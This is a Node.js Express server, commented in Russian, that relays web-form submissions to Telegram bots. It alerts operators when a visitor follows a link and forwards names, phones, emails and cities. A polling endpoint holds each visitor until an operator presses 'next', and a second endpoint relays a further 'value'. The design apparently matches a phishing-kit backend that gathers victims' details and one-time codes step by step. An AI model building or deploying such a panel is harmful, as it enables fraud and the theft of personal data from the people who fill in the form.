const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// CORS + JSON
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  next();
});

// боты
const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

// роли
const adminId = Number(process.env.ADMIN_CHAT_ID);
let moderators = [];

// базы
let bannedUsers = {};
let userStatus = {};
let requests = {};

function isAdmin(id) {
  return id === adminId;
}

function isMod(id) {
  return moderators.includes(id);
}

function isStaff(id) {
  return isAdmin(id) || isMod(id);
}

// ===== ВХОД НА САЙТ С ID =====
app.post("/enter", (req, res) => {
  const clientId = req.body.clientId || "UNKNOWN";

  const msg = `👤переход по ссылке!

🆔 ID: ${clientId}`;

  enterBot.sendMessage(adminId, msg).catch(() => {});

  moderators.forEach(m => {
    enterBot.sendMessage(m, msg).catch(() => {});
  });

  res.json({ ok: true });
});

// ===== ОТПРАВКА =====
app.post("/send", (req, res) => {
  const data = req.body;
  const id = data.clientId;

  if (bannedUsers[id]) {
    return res.json({ ok: false });
  }

  requests[id] = id;
  userStatus[id] = "wait";

  const text = `🆕 ЗАЯВКА ID: ${id}

📦 Услуга: ${data.service}
👤 Имя: ${data.name}
📞 Телефон: ${data.phone}
📧 Email: ${data.email}
🏙 Город: ${data.city}
💬 Комментарий: ${data.comment}`;

  mainBot.sendMessage(adminId, text, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🚫 Бан", callback_data: "ban_" + id },
          { text: "✅ Разбан", callback_data: "unban_" + id }
        ],
        [
          { text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }
        ]
      ]
    }
  }).catch(() => {});

  moderators.forEach(m => {
    mainBot.sendMessage(m, text).catch(() => {});
  });

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  const id = req.params.id;
  res.json({ status: userStatus[id] || "wait" });
});

// ===== ДОП ДАННЫЕ =====
app.post("/send2", (req, res) => {
  const data = req.body;

  const msg = `📩 ДОП ДАННЫЕ

🆔 ID: ${data.id}
💬 Значение: ${data.value}`;

  mainBot.sendMessage(adminId, msg).catch(() => {});
  moderators.forEach(m => {
    mainBot.sendMessage(m, msg).catch(() => {});
  });

  res.json({ ok: true });
});

// ===== КНОПКИ =====
mainBot.on("callback_query", (q) => {
  const fromId = q.from.id;
  if (!isStaff(fromId)) {
    return mainBot.answerCallbackQuery(q.id, { text: "Нет доступа" });
  }

  const data = q.data;
  const id = data.split("_")[1];

  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    mainBot.answerCallbackQuery(q.id, { text: "🚫 забанен ID: " + id });
  }

  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    mainBot.answerCallbackQuery(q.id, { text: "✅ разбан ID: " + id });
  }

  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    mainBot.answerCallbackQuery(q.id, { text: "➡️ перевёл дальше" });
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER WORKING");
});
